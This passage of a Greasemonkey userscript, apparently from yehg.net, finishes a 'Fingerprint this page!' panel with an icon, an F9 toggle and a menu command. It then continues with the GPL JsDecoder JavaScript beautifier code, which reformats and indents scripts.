div2.innerHTML = "<span title='Fingerprint this page!' style='background-color:navy;color:yellow;float:right;border:1px solid black;cursor:pointer;text-decoration:none;' onclick='showYehgFingerprint()'><img  src='data:;base64,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'></span>";

if(printdata.length>284){document.body.appendChild(div);document.body.appendChild(div2);document.body.appendChild(div3);}

} //if(!invalidext.test(document.URL))
}

window.addEventListener('load',unsafeWindow.yehgdoFingerpint,true);
// Quick Access
unsafeWindow.yehgonKeyDown = function(event)
{
		// 120 for F9.  if you sucks , add this ->  && event.ctrlKey
	    if (event.keyCode == 120)
	    {
			if(unsafeWindow.yehgFingerprinterHasShown!=1)
			{
				unsafeWindow.showYehgFingerprint();				
			}
			else
			{
				unsafeWindow.hideYehgFingerprint();				
			}
			
		}
	    	
        else
            return;
        
        event.stopPropagation();
}

GM_registerMenuCommand("Fingerprint this page!",function(){unsafeWindow.showYehgFingerprint();});
unsafeWindow.addEventListener("keypress", unsafeWindow.yehgonKeyDown, false);

}
else if ( (!invalidprotocol.test(yehg_url_scheme)) && (!document.title.search(/(Problem loading page|Page load error)/i)==0))
{
   /******** [ JS Fingerprinting Start ] *********/

// ==Combining with UserScript==
// @name           JS Colorizer
// @namespace      yehg.net
// @developer	   aungkhant
// @original	   I'm not the author. I just made the Greasemonkey version of JS Colorizer by http://code.gosu.pl
// @description    Colorize JS File like in Editors. Just append ?color to js file.
// @include        *
// ==/Combining with UserScript==


/*
 * DO NOT REMOVE THIS NOTICE
 *
 * PROJECT:   JsDecoder
 * VERSION:   1.1.0
 * COPYRIGHT: (c) 2004-2008 Cezary Tomczak
 * LINK:      http://code.gosu.pl
 * LICENSE:   GPL
 */

function JsDecoder()
{
    this.s = '';
    this.len = 0;
    
    this.i = 0;
    this.lvl = 0; /* indent level */
    this.code = [''];
    this.row = 0;
    this.switches = [];

    this.lastWord = '';
    this.nextChar = '';
    this.prevChar = '';
    this.isAssign = false;

    this.decode = function ()
    {
        this.s = this.s.replace(/[\r\n\f]+/g, "\n");
        this.len = this.s.length;
        while (this.i < this.len)
        {
            var c = this.s.charAt(this.i);
            this.charInit();
            this.switch_c(c);
            this.i++;
        }
        return this.code.join("\n");
    };
    this.switch_c = function(c)
    {
        switch (c)
        {
            case "\n":
                this.linefeed(); 
                break;

            case ' ':
            case "\t":
                this.space();
                break;

            case '{':  this.blockBracketOn();  break;
            case '}':  this.blockBracketOff(); break;

            case ':':  this.colon();     break;
            case ';':  this.semicolon(); break;

            case '(':  this.bracketOn();        break;
            case ')':  this.bracketOff();       break;
            case '[':  this.squareBracketOn();  break;
            case ']':  this.squareBracketOff(); break;

            case '"':
            case "'":
                this.quotation(c);
                break;

            case '/':
                if ('/' == this.nextChar) {
                    this.lineComment();
                } else if ('*' == this.nextChar) {
                    this.comment();
                } else {
                    this.slash();
                }
                break;

            case ',':  this.comma(); break;
            case '.':  this.dot(); break;

            case '~':
            case '^':
                this.symbol1(c);
                break;

            case '-': case '+': case '*': case '%':
            case '<': case '=': case '>': case '?':
            case ':': case '&': case '|': case '/':
                this.symbol2(c);
                break;

            case '!':
                if ('=' == this.nextChar) {
                    this.symbol2(c);
                } else {
                    this.symbol1(c);
                }
                break;

            default:
                if (/\w/.test(c)) { this.alphanumeric(c); }
                else { this.unknown(c); }
                break;
        }
        c = this.s.charAt(this.i);
        if (!/\w/.test(c)) {
            this.lastWord = '';
        }
    };
    this.blockBracketOn = function ()
    {
        this.isAssign = false;
        var nextNW = this.nextNonWhite(this.i);
        if ('}' == nextNW) {
            var ss = (this.prevChar == ')' ? ' ' : '');
            this.write(ss+'{');
            this.lvl++;
            return;
            
        }
        if (/^\s*switch\s/.test(this.getCurrentLine())) {
            this.switches.push(this.lvl);
        }
        var line = this.getCurrentLine();
        var line_row = this.row;
        var re = /(,)\s*(\w+\s*:\s*function\s*\([^\)]*\)\s*)$/;
        if (re.test(line)) {
            this.replaceLine(this.code[line_row].replace(re, '$1'));
            this.writeLine();
            var match = re.exec(line);
            this.write(match[2]);
        }

        /* example: return {
            title: 'Jack Slocum',
            iconCls: 'user'}
            After return bracket cannot be on another line
        */
        if (/^\s*return\s*/.test(this.code[this.row])) {
            if (/^\s*return\s+\w+/.test(this.code[this.row])) {
                this.writeLine();
            } else if (this.prevChar != ' ') {
                this.write(' ');
            }
            this.write('{');
            this.writeLine();
            this.lvl++;
            return;
        }

        if (/function\s*/.test(this.code[this.row]) || this.isBlockBig()) {
            this.writeLine();
        } else {
            if (this.prevChar != ' ' && this.prevChar != "\n" && this.prevChar != '(') {
                /*  && this.prevChar != '(' && this.prevChar != '[' */
                this.write(' ');
            }
        }
        this.write('{');
        this.lvl++;
        if ('{' != nextNW) {
            this.writeLine();
        }
    };
    this.isBlockBig = function()
    {
        var i = this.i + 1;
        var count = 0;
        var opened = 0;
        var closed = 0;
        while (i < this.len - 1)
        {
            i++;
            var c = this.s.charAt(i);
            if (/\s/.test(c)) {
                continue;
            }
            if ('}' == c && opened == closed) {
                break;
            }
            if ('{' == c) { opened++; }
            if ('}' == c) { closed++; }
            count++;
            if (count > 80) {
                return true;
            }
        }
        return (count > 80);
    };
    this.blockBracketOff = function ()
    {
        var nextNW = this.nextNonWhite(this.i);
        var prevNW = this.prevNonWhite(this.i);
        var line = this.getCurrentLine();

        if (prevNW != '{')
        {
            if (line.length && nextNW != ';' && nextNW != '}' && nextNW != ')' && nextNW != ',') {
                //this.semicolon();
                this.writeLine();
            } else if (line.length && prevNW != ';' && nextNW == '}' && this.isAssign) {
                this.semicolon();
            } else if (line.length && this.isAssign && prevNW != ';') {
                this.semicolon();
            } else if (line.length && prevNW != ';') {
                if (/^\s*(else)?\s*return[\s(]+/i.test(line)) {
                    this.semicolon();
                } else {
                    this.writeLine();
                }
            }
        }
        this.write('}');

        if (',' == nextNW) {
            this.write(',');
            this.goNextNonWhite();
        }
        var next3 = this.nextManyNW(3);
        if (next3 == '(),') {
            this.write('(),');
            this.goNextManyNW('(),');
            this.writeLine();
        }
        else if (next3 == '();') {
            this.write('();');
            this.goNextManyNW('();');
            this.writeLine();
        }
        else if (next3 == '():') {
            this.write('()');
            this.goNextManyNW('()');
            this.write(' : ');
            this.goNextNonWhite();
        }
        else
        {
            if ('{' == prevNW) {
                if (',' == nextNW && this.getCurrentLine().length < 80) {
                    this.write(' ');
                } else {
                    if (this.nextWord() || '}' == nextNW) {
                        this.writeLine();
                    }
                }
            } else {
                if (')' != nextNW && ']' != nextNW) {
                    if (',' == nextNW && /^[\s\w,]+\)/.test(this.s.substr(this.i, 20))) {
                        this.write(' ');
                    } else {
                        this.writeLine();
                    }
                }
            }
        }
        this.lvl--;

        if (this.switches.length && this.switches[this.switches.length - 1] == this.lvl)
        {
            var row = this.row - 1;
            var spaces1 = str_repeat(' ', this.lvl * 4);
            var spaces2 = str_repeat(' ', (this.lvl + 1) * 4);
            var sw1 = new RegExp('^'+spaces1+'(switch\\s|{)');
            var sw2 = new RegExp('^'+spaces2+'(case|default)[\\s:]');
            var sw3 = new RegExp('^'+spaces2+'[^\\s]');
            while (row > 0) {
                row--;
                if (sw1.test(this.code[row])) {
                    break;
                }
                if (sw2.test(this.code[row])) {
                    continue;
                }
                this.replaceLine('    ' + this.code[row], row);
                /*
                if (sw3.test(this.code[row])) {
                    this.replaceLine('    ' + this.code[row], row);
                }
                */
            }
            this.switches.pop();
        }

        // fix missing brackets for sub blocks

        if (this.sub) {
            return;
        }

        var re1 = /^(\s*else\s*if)\s*\(/;
        var re2 = /^(\s*else)\s+[^{]+/;

        var part = this.s.substr(this.i+1, 100);
        
        if (re1.test(part)) {
            this.i += re1.exec(part)[1].length;
            this.write('else if');
            this.lastWord = 'if';
            //debug(this.getCurrentLine(), 're1');
            this.fixSub('else if');
            //debug(this.getCurrentLine(), 're1 after');
        } else if (re2.test(part)) {
            this.i += re2.exec(part)[1].length;
            this.write('else');
            this.lastWord = 'else';
            //debug(this.getCurrentLine(), 're2');
            this.fixSub('else');
            //debug(this.getCurrentLine(), 're2 after');
        }
    };
    this.bracketOn = function ()
    {
        if (this.isKeyword() && this.prevChar != ' ' && this.prevChar != "\n") {
            this.write(' (');
        } else {
            this.write('(');
        }
    };
    this.bracketOff = function ()
    {
        this.write(')');
        /*
        if (/\w/.test(this.nextNonWhite(this.i))) {
            this.semicolon();
        }
        */
        if (this.sub) {
            return;
        }
        var re = new RegExp('^\\s*(if|for|while|do)\\s*\\([^{}]+\\)$', 'i');
        var line = this.getCurrentLine();
        if (re.test(line)) {
            var c = this.nextNonWhite(this.i);
            if ('{' != c && ';' != c && ')' != c) {
                var opened = 0;
                var closed = 0;
                var foundFirst = false;
                var semicolon = false;
                var fix = false;
                for (var k = 0; k < line.length; k++) {
                    if (line.charAt(k) == '(') {
                        foundFirst = true;
                        opened++;
                    }
                    if (line.charAt(k) == ')') {
                        closed++;
                        if (foundFirst && opened == closed) {
                            if (k == line.length - 1) {
                                fix = true;
                            } else {
                                break;
                            }
                        }
                    }
                }
                if (fix) {
                    //alert(this.s.substr(this.i));
                    //throw 'asdas';
                    //alert(line);
                    this.fixSub(re.exec(line)[1]);
                    /*
                    this.writeLine();
                    this.lvl2++;
                    var indent = '';
                    for (var j = 0; j < this.lvl2; j++) {
                        indent += '    ';
                    }
                    this.write(indent);
                    */
                }
            }
        }
    };
    this.sub = false;
    
    this.orig_i = null;
    this.orig_lvl = null;
    this.orig_code = null;
    this.orig_row = null;
    this.orig_switches = null;

    this.restoreOrig = function (omit_i)
    {
        this.sub = false;
        
        if (!omit_i) { this.i = this.orig_i; }
        this.lvl = this.orig_lvl;
        this.code = this.orig_code;
        this.row = this.orig_row;
        this.switches = this.orig_switches;

        this.prevCharInit();
        
        this.lastWord = '';
        this.charInit();
        this.isAssign = false;
    };
    this.combineSub = function ()
    {
        //debug(this.orig_code, 'orig_code');
        for (i = 0; i < this.code.length; i++) {
            var line = this.orig_code[this.orig_row];
            if (0 == i && line.length) {
                if (line.substr(line.length-1, 1) != ' ') {
                    this.orig_code[this.orig_row] += ' ';
                }
                this.orig_code[this.orig_row] += this.code[i].trim();
            } else {
                this.orig_code[this.orig_row+i] = this.code[i];
            }
        }
        //debug(this.code, 'sub_code');
        //debug(this.orig_code, 'code');
    };
    this.fixSub = function (keyword)
    {
        // repair missing {}: for, if, while, do, else, else if

        if (this.sub) {
            return;
        }

        if ('{' == this.nextNonWhite(this.i)) {
            return;
        }

        var firstWord = this.nextWord();

        //debug(this.code, 'fixSub('+keyword+') start');

        this.orig_i = this.i;
        this.orig_lvl = this.lvl;
        this.orig_code = this.code;
        this.orig_row = this.row;
        this.orig_switches = this.switches;
        
        this.sub = true;
        this.code = [''];
        this.prevChar = '';
        this.row = 0;
        this.switches = [];
        this.isAssign = false;

        this.i++;

        var b1 = 0;
        var b2 = 0;
        var b3 = 0;

        if ('else if' == keyword) {
            var first_b2_closed = false;
        }

        var found = false;

        /*
            try catch
            switch
            while do
            if else else else...

            todo: nestings
            if ()
                if () 
                    if ()
                        for ()
                            if () asd();
                    else
                        asd();
                else
                    if ()
                        try {
                        } catch {}
            else
            if ()
        */
        var b1_lastWord = false;
        var b2_lastWord = false;

        while (!found && this.i < this.len)
        {
            var c = this.s.charAt(this.i);
            this.charInit();
            switch (c)
            {
                case '{': b1++; break;
                case '}':
                    b1--;
                    // case: for(){if (!c.m(g))c.g(f, n[t] + g + ';')}
                    if (0 == b1 && 0 == b2 && 0 == b3 && this.lvl-1 == this.orig_lvl)
                    {
                        var nextWord = this.nextWord();
                        if ('switch' == firstWord) {
                            found = true;
                            break;
                        }
                        if ('try' == firstWord && 'catch' == b1_lastWord) {
                            found = true;
                            break;
                        }
                        if ('while' == firstWord && 'do' == b1_lastWord) {
                            found = true;
                            break;
                        }
                        if ('if' == firstWord) {
                            // todo
                        }
                        if ('if' == keyword && 'else' == nextWord && 'if' != firstWord) {
                            found = true;
                            break;
                        }
                        b1_lastWord = nextWord;
                    }
                    break;
                case '(': b2++; break;
                case ')':
                    b2--;
                    if ('else if' == keyword && 0 == b2 && !first_b2_closed) {
                        if (this.nextNonWhite(this.i) == '{') {
                            this.write(c);
                            this.combineSub();
                            this.restoreOrig(true);
                            //debug(this.code, 'fixSub('+keyword+') b2 return');
                            //debug(this.s.charAt(this.i), ' b2 current char');
                            return;
                        }
                        // do not restore orig i
                        this.write(c);
                        this.combineSub();
                        this.restoreOrig(true);
                        this.fixSub('if');
                        //debug(this.code, 'fixSub('+keyword+') b2 return');
                        return;
                    }
                    break;
                case '[': b3++; break;
                case ']': b3--; break;
                case ';':
                    //debug(this.getCurrentLine(), 'semicolon');
                    //debug([b1, b2, b3]);
                    if (0 == b1 && 0 == b2 && 0 == b3 && this.lvl == this.orig_lvl && 'if' != firstWord) {
                        found = true;
                    }
                    break;
            }
            if (-1 == b1 && b2 == 0 && b3 == 0 && this.prevNonWhite(this.i) != '}') {
                this.write(';');
                this.i--;
                found = true;
            } else if (b1 < 0 || b2 < 0 || b3 < 0) {
                found = false;
                break;
            } else {
                this.switch_c(c);
            }
            this.i++;
        }
        this.i--;

        if (found)
        {
            /*
            var re = /^\s*(else\s+[\s\S]*)$/;
            if ('if' == keyword && re.test(this.getCurrentLine())) {
                this.i = this.i - re.exec(this.getCurrentLine())[1].length;
                this.code[this.row] = '';
            }
            */
            this.s = this.s.substr(0, this.orig_i+1) + '{' + this.code.join("\n") + '}' + this.s.substr(this.i+1);
            this.len = this.s.length;
        }

        //debug("{\n" + this.code.join("\n") + '}', 'fixSub('+keyword+') result');
        //debug(found, 'found');

        this.restoreOrig(false);
    };
    this.squareBracketOn = function ()
    {
        this.checkKeyword();
        this.write('[');
    };
    this.squareBracketOff = function ()
    {
        this.write(']');
    };
    this.isKeyword = function ()
    {
        // Check if this.lastWord is a keyword
        return this.lastWord.length && this.keywords.indexOf(this.lastWord) != -1;
    };
    this.linefeed = function () {};
    this.space = function ()
    {
        if (!this.prevChar.length) {
            return;
        }
        if (' ' == this.prevChar || "\n" == this.prevChar) {
            return;
        }
        if ('}' == this.prevChar && ']' == this.nextChar) {
            //return;
        }
        this.write(' ');
        return;
        
        /*
        if (this.isKeyword()) {
            this.write(' ');
            this.lastWord = '';
        } else {
            var multi = ['in', 'new'];
            for (var i = 0; i < multi.length; i++) {
                var isKeywordNext = true;
                for (var j = 0; j < multi[i].length; j++) {
                    if (multi[i][j] != this.s.charAt(this.i + 1 + j)) {
                        isKeywordNext = false;
                        break;
                    }
                }
                if (isKeywordNext) {
                    this.write(' ');
                    this.lastWord = '';
                    break;
                }
            }
        }
        */
    };
    this.checkKeyword = function ()
    {
        if (this.isKeyword() && this.prevChar != ' ' && this.prevChar != "\n") {
            this.write(' ');
        }
    };
    this.nextWord = function ()
    {
        var i = this.i;
        var word = '';
        while (i < this.len - 1)
        {
            i++;
            var c = this.s.charAt(i);
            if (word.length) {
                if (/\s/.test(c)) {
                    break;
                } else if (/\w/.test(c)) {
                    word += c;
                } else {
                    break;
                }
            } else {
                if (/\s/.test(c)) {
                    continue;
                } else if (/\w/.test(c)) {
                    word += c;
                } else {
                    break;
                }
            }
        }
        if (word.length) {
            return word;
        }
        return false;
    };
    this.nextManyNW = function(many)
    {
        var ret = '';
        var i = this.i;
        while (i < this.len - 1)
        {
            i++;
            var c = this.s.charAt(i);
            if (!/^\s+$/.test(c)) {
                ret += c;
                if (ret.length == many) {
                    return ret;
                }
            }
        }
        return false;
    }
    this.goNextManyNW = function (cc)
    {
        var ret = '';
        var i = this.i;
        while (i < this.len - 1)
        {
            i++;
            var c = this.s.charAt(i);
            if (!/^\s+$/.test(c)) {
                ret += c;
                if (ret == cc) {
                    this.i = i;
                    this.charInit();
                    return true;
                }
                if (ret.length >= cc.length) {
                    return false;
                }
            }
        }
        return false;
    };
    this.nextNonWhite = function (i)
    {
        while (i < this.len - 1)
        {
            i++;
            var c = this.s.charAt(i);
            if (!/^\s+$/.test(c)) {
                return c;
            }
        }
        return false;
    };
    this.prevNonWhite = function (i)
    {
        while (i > 0)
        {
            i--;
            var c = this.s.charAt(i);
            if (!/^\s+$/.test(c)) {
                return c;
            }
        }
        return false;
    };
    this.goNextNonWhite = function ()
    {
        // you need to write() this nonWhite char when calling this func
        var i = this.i;
        while (i < this.len - 1)
        {
            i++;
            var c = this.s.charAt(i);
            if (!/^\s+$/.test(c)) {
                this.i = i;
                this.charInit();
                return true;
            }
        }
        return false;
    };
    this.colon = function ()
    {
        //alert(this.getCurrentLine());
        /* case 6: expr ? stat : stat */
        var line = this.getCurrentLine();
        if (/^\s*case\s/.test(line) || /^\s*default$/.test(line)) {
            this.write(':');
            this.writeLine();
        } else {
            this.symbol2(':');
        }
    };
    this.isStart = function ()
    {
        return this.getCurrentLine().length === 0;
    };
    this.backLine = function ()
    {
        if (!this.isStart) {
            throw 'backLine() may be called only at the start of the line';
        }
        this.code.length = this.code.length-1;
        this.row--;
    };
    this.semicolon = function ()
    {
        /* for statement: for (i = 1; i < len; i++) */
        this.isAssign = false;
        if (this.isStart()) {
            this.backLine();
        }
        this.write(';');
        if (/^\s*for\s/.test(this.getCurrentLine())) {
            this.write(' ');
        } else {
            this.writeLine();
        }
    };
    this.quotation = function (quotation)
    {
        this.checkKeyword();
        var escaped = false;
        this.write(quotation);
        while (this.i < this.len - 1) {
            this.i++;
            var c = this.s.charAt(this.i);
            if ('\\' == c) {
                escaped = (escaped ? false : true);
            }
            this.write(c);
            if (c == quotation) {
                if (!escaped) {
                    break;
                }
            }
            if ('\\' != c) {
                escaped = false;
            }
        }
        //debug(this.getCurrentLine(), 'quotation');
        //debug(this.s.charAt(this.i), 'char');
    };
    this.lineComment = function ()
    {
        this.write('//');
        this.i++;
        while (this.i < this.len - 1) {
            this.i++;
            var c = this.s.charAt(this.i);
            if ("\n" == c) {
                this.writeLine();
                break;
            }
            this.write(c);
        }
    };
    this.comment = function ()
    {
        this.write('/*');
        this.i++;
        var c = '';
        var prevC = '';
        while (this.i < this.len - 1)
        {
            this.i++;
            prevC = c;
            c = this.s.charAt(this.i);
            if (' ' == c || "\t" == c || "\n" == c) {
                if (' ' == c) {
                    if (this.getCurrentLine().length > 100) {
                        this.writeLine();
                    } else {
                        this.write(' ', true);
                    }
                } else if ("\t" == c) {
                    this.write('    ', true);
                } else if ("\n" == c) {
                    this.writeLine();
                }
            } else {
                this.write(c, true);
            }
            if ('/' == c && '*' == prevC) {
                break;
            }
        }
        this.writeLine();
    };
    this.slash = function ()
    {
        /*
        divisor /= or *\/ (4/5 , a/5)
        regexp /\w/ (//.test() , var asd = /some/;)
        asd /= 5;
        bbb = * / (4/5)
        asd =( a/5);
        regexp = /\w/;
        /a/.test();
        var asd = /some/;
        obj = { sasd : /pattern/ig }
        */
        var a_i = this.i - 1;
        var a_c = this.s.charAt(a_i);
        for (a_i = this.i - 1; a_i >= 0; a_i--) {
            var c2 = this.s.charAt(a_i);
            if (' ' == c2 || '\t' == c2) {
                continue;
            }
            a_c = this.s.charAt(a_i);
            break;
        }
        var a = /^\w+$/.test(a_c) || ']' == a_c || ')' == a_c;
        var b = ('*' == this.prevChar);
        if (a || b) {
            if (a) {
                if ('=' == this.nextChar) {
                    var ss = this.prevChar == ' ' ? '' : ' ';
                    this.write(ss+'/');
                } else {
                    this.write(' / ');
                }
            } else if (b) {
                this.write('/ ');
            }
        } else if (')' == this.prevChar) {
            this.write(' / ');
        } else {
            var ret = '';
            if ('=' == this.prevChar || ':' == this.prevChar) {
                ret += ' /';
            } else {
                ret += '/';
            }
            var escaped = false;
            while (this.i < this.len - 1) {
                this.i++;
                var c = this.s.charAt(this.i);
                if ('\\' == c) {
                    escaped = (escaped ? false : true);
                }
                ret += c;
                if ('/' == c) {
                    if (!escaped) {
                        break;
                    }
                }
                if ('\\' != c) {
                    escaped = false;
                }
            }
            this.write(ret);
        }
    };
    this.comma = function ()
    {
        /*
         * function arguments seperator
         * array values seperator
         * object values seperator
         */
        this.write(', ');
        var line = this.getCurrentLine();
        if (line.replace(' ', '').length > 100) {
            this.writeLine();
        }
    };
    this.dot = function ()
    {
        this.write('.');
    };
    this.symbol1 = function (c)
    {
        if ('=' == this.prevChar && '!' == c) {
            this.write(' '+c);
        } else {
            this.write(c);
        }
    };
    this.symbol2 = function (c)
    {
        // && !p
        // ===
        if ('+' == c || '-' == c) {
            if (c == this.nextChar || c == this.prevChar) {
                this.write(c);
                return;
            }
        }
        var ss = (this.prevChar == ' ' ? '' : ' ');
        var ss2 = ' ';
        if ('(' == this.prevChar) {
            ss = '';
            ss2 = '';
        }
        if ('-' == c && ('>' == this.prevChar || '>' == this.prevChar)) {
            this.write(' '+c);
            return;
        }
        if (this.symbols2.indexOf(this.prevChar) != -1) {
            if (this.symbols2.indexOf(this.nextChar) != -1) {
                this.write(c + (this.nextChar == '!' ? ' ' : ''));
            } else {
                this.write(c + ss2);
            }
        } else {
            if (this.symbols2.indexOf(this.nextChar) != -1) {
                this.write(ss + c);
            } else {
                this.write(ss + c + ss2);
            }
        }
        if ('=' == c && /^[\w\]]$/.test(this.prevNonWhite(this.i)) && /^[\w\'\"\[]$/.test(this.nextNonWhite(this.i))) {
            this.isAssign = true;
        }
    };
    this.alphanumeric = function (c)
    {
        /* /[a-zA-Z0-9_]/ == /\w/ */
        if (this.lastWord) {
            this.lastWord += c;
        } else {
            this.lastWord = c;
        }
        if (')' == this.prevChar) {
            c = ' '+c;
        }
        this.write(c);
    };
    this.unknown = function (c)
    {
        //throw 'Unknown char: "'+c+'" , this.i = ' + this.i;
        this.write(c);
    };

    this.charInit = function ()
    {
        /*
        if (this.i > 0) {
            //this.prevChar = this.s.charAt(this.i - 1);
            var line = this.code[this.row];
            if (line.length) {
                this.prevChar = line.substr(line.length-1, 1);
            } else {
                this.prevChar = '';
            }
        } else {
            this.prevChar = '';
        }
        */
        if (this.len - 1 === this.i) {
            this.nextChar = '';
        } else {
            this.nextChar = this.s.charAt(this.i + 1);
        }
    };
    this.write = function (s, isComment)
    {
        if (isComment) {
            if (!/\s/.test(s)) {
                if (this.code[this.row].length < this.lvl * 4) {
                    this.code[this.row] += str_repeat(' ', this.lvl * 4 - this.code[this.row].length);
                }
            }
            this.code[this.row] += s;
        } else {
            if (0 === this.code[this.row].length) {
                var lvl = ('}' == s ? this.lvl - 1 : this.lvl);
                for (var i = 0; i < lvl; i++) {
                    this.code[this.row] += '    ';
                }
                    this.code[this.row] += s;
            } else {
                this.code[this.row] += s;
            }
        }
        this.prevCharInit();
    };
    this.writeLine = function ()
    {
        this.code.push('');
        this.row++;
        this.prevChar = "\n";
    };
    this.replaceLine = function (line, row)
    {
        if ('undefined' == typeof row) {
            row = false;
        }
        if (row !== false) {
            if (!/^\d+$/.test(row) || row < 0 || row > this.row) {
                throw 'replaceLine() failed: invalid row='+row;
            }
        }
        if (row !== false) {
            this.code[row] = line;
        } else {
            this.code[this.row] = line;
        }
        if (row === false || row == this.row) {
            this.prevCharInit();
        }
    };
    this.prevCharInit = function ()
    {
        this.prevChar = this.code[this.row].charAt(this.code[this.row].length - 1);
    };
    this.writeTab = function ()
    {
        this.write('    ');
        this.prevChar = ' ';
    };
    this.getCurrentLine = function ()
    {
        return this.code[this.row];
    };

    this.symbols1 = '~!^';
    this.symbols2 = '-+*%<=>?:&|/!';
